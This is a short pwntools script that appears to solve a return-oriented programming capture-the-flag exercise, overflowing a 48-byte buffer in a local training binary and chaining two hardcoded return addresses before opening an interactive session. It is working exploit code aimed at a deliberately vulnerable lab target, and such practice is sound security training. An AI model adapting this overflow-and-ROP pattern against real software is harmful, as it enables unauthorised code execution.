from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level2.1")

io = elf.process()
buff_len = 48+8 #0x30 (+8)
io.send(b"A"*56+p64(0x401810)+p64(0x4018bd)) 
io.interactive()